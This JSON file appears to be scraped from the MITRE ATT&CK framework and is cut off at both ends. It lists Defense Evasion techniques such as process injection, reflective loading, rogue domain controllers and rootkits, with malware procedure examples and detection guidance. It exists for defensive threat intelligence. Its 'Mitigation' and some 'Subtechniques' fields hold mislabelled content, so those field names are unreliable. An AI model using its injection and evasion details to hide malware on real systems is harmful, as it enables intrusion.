        "detects": "Monitor executed commands and arguments for indicators of obfuscation and potentially suspicious syntax such as uninterpreted escape characters (e.g., ^).Also monitor command-lines for syntax-specific signs of obfuscation, such as variations of arguments associated with encoding."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system)."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Metadata",
        "detects": "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions, etc.File-based signatures may be capable of detecting code obfuscation depending on the methods used.[375][376][377]"
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitoring module loads, especially those not explicitly included in import tables, may highlight obfuscated code functionality. Dynamic malware analysis may also expose signs of code obfuscation.[376]"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor and analyze calls to functions such as  GetProcAddress() that are associated with malicious code obfuscation.[375]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit."
      },
      {
        "id": "DS0012",
        "dsource": "Script",
        "dcomp": "Script Execution",
        "detects": "Monitor executed scripts for indicators of obfuscation and potentially suspicious command syntax, such as uninterpreted escape characters (e.g., ^).Also monitor commands within scripts for syntax-specific signs of obfuscation, such as encoded or otherwise unreadable blobs of characters."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Creation",
        "detects": "Monitor for the creation of Registry values that may highlight storage of malicious data such as commands or payloads."
      },
      {
        "id": "DS0005",
        "dsource": "WMI",
        "dcomp": "WMI Creation",
        "detects": "Monitor for the creation of WMI Objects and values that may highlight storage of malicious data such as commands or payloads."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1027.001",
        "name": "Binary Padding"
      },
      {
        "id": "T1027.002",
        "name": "Software Packing"
      },
      {
        "id": "T1027.003",
        "name": "Steganography"
      },
      {
        "id": "T1027.004",
        "name": "Compile After Delivery"
      },
      {
        "id": "T1027.005",
        "name": "Indicator Removal from Tools"
      },
      {
        "id": "T1027.006",
        "name": "HTML Smuggling"
      },
      {
        "id": "T1027.007",
        "name": "Dynamic API Resolution"
      },
      {
        "id": "T1027.008",
        "name": "Stripped Payloads"
      },
      {
        "id": "T1027.009",
        "name": "Embedded Payloads"
      },
      {
        "id": "T1027.010",
        "name": "Command Obfuscation"
      },
      {
        "id": "T1027.011",
        "name": "Fileless Storage"
      },
      {
        "id": "T1027.012",
        "name": "LNK Icon Smuggling"
      }
    ],
    "Tactic": "\nDefense Evasion"
  },
  {
    "Title": "Plist File Modification",
    "Code": "T1647",
    "Description": "Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the info.plist file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.[1] Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. Hidden Window) or running additional commands for persistence (ex: Launch Agent/Launch Daemon or Re-opened Applications).For example, adversaries can add a malicious application path to the ~/Library/Preferences/com.apple.dock.plist file, which controls apps that appear in the Dock. Adversaries can also modify the LSUIElement key in an application’s info.plist file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as LSEnvironment, to enable persistence via Dynamic Linker Hijacking.[2][3]",
    "Mitigation": [
      {
        "id": "S0658",
        "name": "XCSSET",
        "description": "XCSSET uses the plutil command to modify the LSUIElement, DFBundleDisplayName, and CFBundleIdentifier keys in the /Contents/Info.plist file to change how XCSSET is visible on the system.[4]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor for commands with arguments (such as opening common command-line editors) used to modify plist files, especially commonly abused files such as those in \\~/LaunchAgents, \\~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm, and an application's Info.plist."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Modification",
        "detects": "Monitor for plist file modification, especially if immediately followed by other suspicious events such as code execution from \\~/Library/Scripts or \\~/Library/Preferences. Also, monitor for significant changes to any path pointers in a modified plist."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes with arguments that can modify property list (plist) files."
      }
    ],
    "Subtechniques": "\nDefense Evasion"
  },
  {
    "Title": "Pre-OS Boot",
    "Code": "T1542",
    "Description": "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.[1]Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",
    "Mitigation": [
      {
        "id": "M1046",
        "name": "Boot Integrity",
        "description": "Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised. Check the integrity of the existing BIOS or EFI to determine if it is vulnerable to modification. [2] [3]"
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": "Ensure proper permissions are in place to help prevent adversary access to privileged accounts necessary to perform these actions"
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": "Patch the BIOS and EFI as necessary."
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments in command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration."
      },
      {
        "id": "DS0016",
        "dsource": "Drive",
        "dcomp": "Drive Modification",
        "detects": "Monitor for changes to MBR and VBR as they occur for indicators for suspicious activity and further analysis. Take snapshots of MBR and VBR and compare against known good samples."
      },
      {
        "id": "DS0027",
        "dsource": "Driver",
        "dcomp": "Driver Metadata",
        "detects": "Disk check, forensic utilities, and data from device drivers (i.e. processes and API calls) may reveal anomalies that warrant deeper investigation"
      },
      {
        "id": "DS0001",
        "dsource": "Firmware",
        "dcomp": "Firmware Modification",
        "detects": "Monitor for changes made on pre-OS boot mechanisms that can be manipulated for malicious purposes. Take snapshots of boot records and firmware and compare against known good images. Log changes to boot records, BIOS, and EFI"
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network device configuration and system image against a known-good version to discover unauthorized changes to system boot, startup configuration, or the running OS. The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. Disk check, forensic utilities, and data from device drivers (i.e. API calls) may reveal anomalies that warrant deeper investigation. [4]"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1542.001",
        "name": "System Firmware"
      },
      {
        "id": "T1542.002",
        "name": "Component Firmware"
      },
      {
        "id": "T1542.003",
        "name": "Bootkit"
      },
      {
        "id": "T1542.004",
        "name": "ROMMONkit"
      },
      {
        "id": "T1542.005",
        "name": "TFTP Boot"
      }
    ],
    "Tactic": "DefenseEvasion, Persistence"
  },
  {
    "Title": "Process Injection",
    "Code": "T1055",
    "Description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
    "Mitigation": [
      {
        "id": "C0028",
        "name": "2015 Ukraine Electric Power Attack",
        "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team loaded BlackEnergy into svchost.exe, which then launched iexplore.exe for their C2. [1]"
      },
      {
        "id": "S0469",
        "name": "ABK",
        "description": "ABK has the ability to inject shellcode into svchost.exe.[2]"
      },
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla can inject into known, vulnerable binaries on targeted hosts.[3]"
      },
      {
        "id": "S1074",
        "name": "ANDROMEDA",
        "description": "ANDROMEDA can inject into the wuauclt.exe process to perform C2 actions.[4]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 malware has injected a Cobalt Strike beacon into Rundll32.exe.[5]"
      },
      {
        "id": "G0067",
        "name": "APT37",
        "description": "APT37 injects its malware variant, ROKRAT, into the cmd.exe process.[6]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process.[7]"
      },
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Attor's dispatcher can inject itself into running processes to gain higher privileges and to evade detection.[8]"
      },
      {
        "id": "S0347",
        "name": "AuditCred",
        "description": "AuditCred can inject code from files to other running processes.[9]"
      },
      {
        "id": "S0473",
        "name": "Avenger",
        "description": "Avenger has the ability to inject shellcode into svchost.exe.[2]"
      },
      {
        "id": "S0093",
        "name": "Backdoor.Oldrea",
        "description": "Backdoor.Oldrea injects itself into explorer.exe.[10][11]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can inject itself into an existing explorer.exe process by using RtlCreateUserThread.[12][13]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can inject code through calling VirtualAllocExNuma.[14]"
      },
      {
        "id": "S0470",
        "name": "BBK",
        "description": "BBK has the ability to inject shellcode into svchost.exe.[2]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee can inject code into multiple processes on infected endpoints.[15]"
      },
      {
        "id": "S0348",
        "name": "Cardinal RAT",
        "description": "Cardinal RAT injects into a newly spawned process created from a native Windows executable.[16]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling can inject into the svchost.exe process for execution.[17]"
      },
      {
        "id": "G0080",
        "name": "Cobalt Group",
        "description": "Cobalt Group has injected code into trusted processes.[18]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can inject a variety of payloads into processes dynamically chosen by the adversary.[19][20][21]"
      },
      {
        "id": "S0614",
        "name": "CostaBricks",
        "description": "CostaBricks can inject a payload into the memory of a compromised host.[22]"
      },
      {
        "id": "S0695",
        "name": "Donut",
        "description": "Donut includes a subproject DonutTest to inject shellcode into a target process.[23]"
      },
      {
        "id": "S0024",
        "name": "Dyre",
        "description": "Dyre has the ability to directly inject its code into the web browser process.[24]"
      },
      {
        "id": "S0554",
        "name": "Egregor",
        "description": "Egregor can inject its payload into iexplore.exe process.[25]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire contains multiple modules for injecting into processes, such as Invoke-PSInject.[26]"
      },
      {
        "id": "S0168",
        "name": "Gazer",
        "description": "Gazer injects its communication module into an Internet accessible process through which it performs C2.[27][28]"
      },
      {
        "id": "S0032",
        "name": "gh0st RAT",
        "description": "gh0st RAT can inject malicious code into process created by the \"Command_Create&Inject\" function.[29]"
      },
      {
        "id": "S0561",
        "name": "GuLoader",
        "description": "GuLoader has the ability to inject shellcode into a donor processes that is started in a suspended state. GuLoader has previously used RegAsm as a donor process.[30]"
      },
      {
        "id": "S0376",
        "name": "HOPLIGHT",
        "description": "HOPLIGHT has injected into running processes.[31]"
      },
      {
        "id": "S0040",
        "name": "HTRAN",
        "description": "HTRAN can inject into into running processes.[32]"
      },
      {
        "id": "S0398",
        "name": "HyperBro",
        "description": "HyperBro can run shellcode it injects into a newly created process.[33]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can inject itself into another process to avoid detection including use of a technique called ListPlanting that customizes the sorting algorithm in a ListView structure.[34]"
      },
      {
        "id": "S0581",
        "name": "IronNetInjector",
        "description": "IronNetInjector can use an IronPython scripts to load a .NET injector to inject a payload into its own or a remote process.[35]"
      },
      {
        "id": "S0044",
        "name": "JHUHUGIT",
        "description": "JHUHUGIT performs code injection injecting its own functions to browser processes.[36][37]"
      },
      {
        "id": "S0201",
        "name": "JPIN",
        "description": "JPIN can inject content into lsass.exe to load a module.[38]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has used Win7Elevate to inject malicious code into explorer.exe.[39]"
      },
      {
        "id": "S0681",
        "name": "Lizar",
        "description": "Lizar can migrate the loader into another process.[40]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain can inject the loader file, Speech02.db, into a process.[41]"
      },
      {
        "id": "S0084",
        "name": "Mis-Type",
        "description": "Mis-Type has been injected directly into a running process, including explorer.exe.[42]"
      },
      {
        "id": "S0247",
        "name": "NavRAT",
        "description": "NavRAT copies itself into a running Internet Explorer process to evade detection.[43]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE can inject code into system processes including notepad.exe, svchost.exe, and vbc.exe.[44]"
      },
      {
        "id": "C0013",
        "name": "Operation Sharpshooter",
        "description": "During Operation Sharpshooter, threat actors leveraged embedded shellcode to inject a downloader into the memory of Word.[45]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors injected code into a selected process, which in turn launches a command as a child process of the original.[46]"
      },
      {
        "id": "S0664",
        "name": "Pandora",
        "description": "Pandora can start and inject code into a new svchost process.[47]"
      },
      {
        "id": "S1050",
        "name": "PcShare",
        "description": "The PcShare payload has been injected into the logagent.exe and rdpclip.exe processes.[48]"
      },
      {
        "id": "G0068",
        "name": "PLATINUM",
        "description": "PLATINUM has used various methods of process injection including hot patching.[38]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 contains multiple modules for injecting into processes, such as Invoke-PSInject.[49]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can inject itself into processes including explore.exe, Iexplore.exe, Mobsync.exe., and wermgr.exe.[50][51][52][53][54]"
      },
      {
        "id": "S0332",
        "name": "Remcos",
        "description": "Remcos has a command to hide itself through injecting into another process.[55]"
      },
      {
        "id": "S0496",
        "name": "REvil",
        "description": "REvil can inject itself into running processes on a compromised host.[56]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can use VirtualAlloc, WriteProcessMemory, and then CreateRemoteThread to execute shellcode within the address space of Notepad.exe.[57]"
      },
      {
        "id": "S0446",
        "name": "Ryuk",
        "description": "Ryuk has injected itself into remote processes to encrypt files using a combination of VirtualAlloc, WriteProcessMemory, and CreateRemoteThread.[58]"
      },
      {
        "id": "S0596",
        "name": "ShadowPad",
        "description": "ShadowPad has injected an install module into a newly created process.[59]"
      },
      {
        "id": "G0091",
        "name": "Silence",
        "description": "Silence has injected a DLL library containing a Trojan into the fwmain32.exe process.[60]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can inject shellcode directly into Excel.exe or a specific process.[61]"
      },
      {
        "id": "S0633",
        "name": "Sliver",
        "description": "Sliver can inject code into local and remote processes.[62][63]"
      },
      {
        "id": "S0533",
        "name": "SLOTHFULMEDIA",
        "description": "SLOTHFULMEDIA can inject into running processes on a compromised host.[64]"
      },
      {
        "id": "S0226",
        "name": "Smoke Loader",
        "description": "Smoke Loader injects into the Internet Explorer process.[65]"
      },
      {
        "id": "S0380",
        "name": "StoneDrill",
        "description": "StoneDrill has relied on injecting its payload directly into the process memory of the victim's preferred browser.[66]"
      },
      {
        "id": "G1018",
        "name": "TA2541",
        "description": "TA2541 has injected malicious code into legitimate .NET related processes including  regsvcs.exe, msbuild.exe, and installutil.exe.[67][68]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot has used Nt* Native API functions to inject code into legitimate processes such as wermgr.exe.[69]"
      },
      {
        "id": "S0436",
        "name": "TSCookie",
        "description": "TSCookie has the ability to inject code into the svchost.exe, iexplorer.exe, explorer.exe, and default browser processes.[70]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla has also used PowerSploit's Invoke-ReflectivePEInjection.ps1 to reflectively load a PowerShell payload into a random process on the victim system.[71]"
      },
      {
        "id": "S0670",
        "name": "WarzoneRAT",
        "description": "WarzoneRAT has the ability to inject malicious DLLs into a specific process for privilege escalation.[72]"
      },
      {
        "id": "S0579",
        "name": "Waterbear",
        "description": "Waterbear can inject decrypted shellcode into the LanmanServer service.[73]"
      },
      {
        "id": "S0206",
        "name": "Wiarp",
        "description": "Wiarp creates a backdoor through which remote attackers can inject files into running processes.[74]"
      },
      {
        "id": "S0176",
        "name": "Wingbird",
        "description": "Wingbird performs multiple process injections to hijack system processes and execute malicious code.[75]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used process injection to execute payloads to escalate privileges.[76]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT can inject code into a targeted process by writing to the remote memory of an infected system and then create a remote thread.[77]"
      }
    ],
    "Detection": [
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Metadata",
        "detects": "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions, etc."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for changes made to files that may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges."
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC/NtQueueApcThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique.[79] Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.[80] [81] [82] [83]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Access",
        "detects": "Monitor for processes being viewed that may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Metadata",
        "detects": "Monitor for process memory inconsistencies, such as checking memory ranges against a known copy of the legitimate module.[84]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Modification",
        "detects": "Monitor for changes made to processes that may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1055.001",
        "name": "Dynamic-link Library Injection"
      },
      {
        "id": "T1055.002",
        "name": "Portable Executable Injection"
      },
      {
        "id": "T1055.003",
        "name": "Thread Execution Hijacking"
      },
      {
        "id": "T1055.004",
        "name": "Asynchronous Procedure Call"
      },
      {
        "id": "T1055.005",
        "name": "Thread Local Storage"
      },
      {
        "id": "T1055.008",
        "name": "Ptrace System Calls"
      },
      {
        "id": "T1055.009",
        "name": "Proc Memory"
      },
      {
        "id": "T1055.011",
        "name": "Extra Window Memory Injection"
      },
      {
        "id": "T1055.012",
        "name": "Process Hollowing"
      },
      {
        "id": "T1055.013",
        "name": "Process Doppelgänging"
      },
      {
        "id": "T1055.014",
        "name": "VDSO Hijacking"
      },
      {
        "id": "T1055.015",
        "name": "ListPlanting"
      }
    ],
    "Tactic": "DefenseEvasion, PrivilegeEscalation"
  },
  {
    "Title": "Reflective Code Loading",
    "Code": "T1620",
    "Description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).[1][2][3][4][5]Reflective code injection is very similar to Process Injection except that the \"injection\" loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.[3][4][6][7]",
    "Mitigation": [
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can copy a large byte array of 64-bit shellcode into process memory and execute it with a call to CreateThread.[8]"
      },
      {
        "id": "S1063",
        "name": "Brute Ratel C4",
        "description": "Brute Ratel C4 has used reflective loading to execute malicious DLLs.[9]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike's execute-assembly command can run a .NET executable within the memory of a sacrificial process by loading the CLR.[10]"
      },
      {
        "id": "S0625",
        "name": "Cuba",
        "description": "Cuba loaded the payload into memory using PowerShell.[11]"
      },
      {
        "id": "S0695",
        "name": "Donut",
        "description": "Donut can generate code modules that enable in-memory execution of VBScript, JScript, EXE, DLL, and dotNET payloads.[12]"
      },
      {
        "id": "S0367",
        "name": "Emotet",
        "description": "Emotet has reflectively loaded payloads into memory.[13]"
      },
      {
        "id": "S0661",
        "name": "FoggyWeb",
        "description": "FoggyWeb's loader has reflectively loaded .NET-based assembly/payloads into memory.[14]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium can use custom shellcode to map embedded DLLs into memory.[15]"
      },
      {
        "id": "S1022",
        "name": "IceApple",
        "description": "IceApple can use reflective code loading to load .NET assemblies into MSExchangeOWAAppPool on targeted Exchange servers.[16]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has changed memory protection permissions then overwritten in memory DLL function code with shellcode, which was later executed via KernelCallbackTable hijacking. Lazarus Group has also used shellcode within macros to decrypt and manually map DLLs into memory at runtime.[17][18]"
      },
      {
        "id": "S0447",
        "name": "Lokibot",
        "description": "Lokibot has reflectively loaded the decoded DLL into memory.[19]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain has reflectively loaded a DLL to read, decrypt, and load an orchestrator file.[20]"
      },
      {
        "id": "S0194",
        "name": "PowerSploit",
        "description": "PowerSploit reflectively loads a Windows PE file into a process.[21][22]"
      },
      {
        "id": "S1085",
        "name": "Sardonic",
        "description": "Sardonic has a plugin system that can load specially made DLLs into memory and execute their functions.[23][24]"
      },
      {
        "id": "S0595",
        "name": "ThiefQuest",
        "description": "ThiefQuest uses various API functions such as NSCreateObjectFileImageFromMemory to load and link in-memory payloads.[25]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos has the ability to load new modules directly into memory using its Load Modules Mem command.[26]"
      },
      {
        "id": "S0689",
        "name": "WhisperGate",
        "description": "WhisperGate's downloader can reverse its third stage file bytes and reflectively load the file as a .NET assembly.[27]"
      }
    ],
    "Detection": [
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor for artifacts of abnormal process execution. For example, a common signature related to reflective code loading on Windows is mechanisms related to the .NET Common Language Runtime (CLR) -- such as mscor.dll, mscoree.dll, and clr.dll -- loading into abnormal processes (such as notepad.exe)"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for code artifacts associated with reflectively loading code, such as the abuse of .NET functions such as Assembly.Load() and Native API functions such as CreateThread(), memfd_create(), execve(), and/or execveat().[4][7]"
      },
      {
        "id": "DS0012",
        "dsource": "Script",
        "dcomp": "Script Execution",
        "detects": "Similarly, AMSI / ETW traces can be used to identify signs of arbitrary code execution from within the memory of potentially compromised processes.[28][1]"
      }
    ],
    "Subtechniques": "\nDefense Evasion"
  },
  {
    "Title": "Rogue Domain Controller",
    "Code": "T1207",
    "Description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. [1] Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. [2]This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). [1] The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform SID-History Injection and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. [1]",
    "Mitigation": [
      {
        "id": "S0002",
        "name": "Mimikatz",
        "description": "Mimikatz’s LSADUMP::DCShadow module can be used to make AD updates by temporarily setting a computer to be a DC.[3][2]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Object Creation",
        "detects": "Baseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects.[1]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Active Directory Object Modification",
        "detects": "Leverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies.[4] [5] Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929). [1]"
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to/from non DC hosts. [6][1] DC replication will naturally take place every 15 minutes but can be triggered by an adversary or by legitimate urgent changes (ex: passwords)."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Authentication",
        "detects": "Investigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with \"GC/\") by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2) can be set without logging.[5] A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete."
      }
    ],
    "Subtechniques": "\nDefense Evasion"
  },
  {
    "Title": "Rootkit",
    "Code": "T1014",
    "Description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. [1] Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or System Firmware. [2] Rootkits have been seen for Windows, Linux, and Mac OS X systems. [3] [4]",
    "Mitigation": [
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has used a UEFI (Unified Extensible Firmware Interface) rootkit known as LoJax.[5][6]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 deployed rootkits on Linux systems.[7][8]"
      },
      {
        "id": "S0484",
        "name": "Carberp",
        "description": "Carberp has used user mode rootkit techniques to remain hidden on the system.[9]"
      },
      {
        "id": "S0572",
        "name": "Caterpillar WebShell",
        "description": "Caterpillar WebShell has a module to use a rootkit on a system.[10]"
      },
      {
        "id": "S0502",
        "name": "Drovorub",
        "description": "Drovorub has used a kernel module rootkit to hide processes, files, executables, and network artifacts from user space view.[11]"
      },
      {
        "id": "S0377",
        "name": "Ebury",
        "description": "Ebury has used user mode rootkit techniques to remain hidden on the system.[12]"
      },
      {
        "id": "S0047",
        "name": "Hacking Team UEFI Rootkit",
        "description": "Hacking Team UEFI Rootkit is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.[13]"
      },
      {
        "id": "S0394",
        "name": "HiddenWasp",
        "description": "HiddenWasp uses a rootkit to hook and implement functions on the system.[14]"
      },
      {
        "id": "S0135",
        "name": "HIDEDRV",
        "description": "HIDEDRV is a rootkit that hides certain operating system artifacts.[15]"
      },
      {
        "id": "S0009",
        "name": "Hikit",
        "description": "Hikit is a Rootkit that has been used by Axiom.[16] [17]"
      },
      {
        "id": "S0601",
        "name": "Hildegard",
        "description": "Hildegard has modified /etc/ld.so.preload to overwrite readdir() and readdir64().[18]"
      },
      {
        "id": "S0040",
        "name": "HTRAN",
        "description": "HTRAN can install a rootkit to hide network connections from the host OS.[19]"
      },
      {
        "id": "S0397",
        "name": "LoJax",
        "description": "LoJax is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems.[6]"
      },
      {
        "id": "S0012",
        "name": "PoisonIvy",
        "description": "PoisonIvy starts a rootkit from a malicious file dropped to disk.[20]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay has included a rootkit to evade defenses.[21]"
      },
      {
        "id": "G0106",
        "name": "Rocke",
        "description": "Rocke has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.[22]"
      },
      {
        "id": "S0468",
        "name": "Skidmap",
        "description": "Skidmap is a kernel-mode rootkit that has the ability to hook system calls to hide specific files and fake network and CPU-related statistics to make the CPU load of the infected machine always appear low.[23]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
